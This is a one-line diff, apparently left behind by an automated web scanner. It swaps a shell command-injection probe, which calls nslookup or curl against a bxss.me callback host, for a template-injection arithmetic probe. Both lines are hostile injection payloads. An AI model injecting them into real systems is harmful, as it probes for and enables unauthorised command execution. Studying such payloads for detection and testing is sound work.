@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitihdxnokevwae350.bxss.me||curl hitihdxnokevwae350.bxss.me)
+${9999878+10000447}
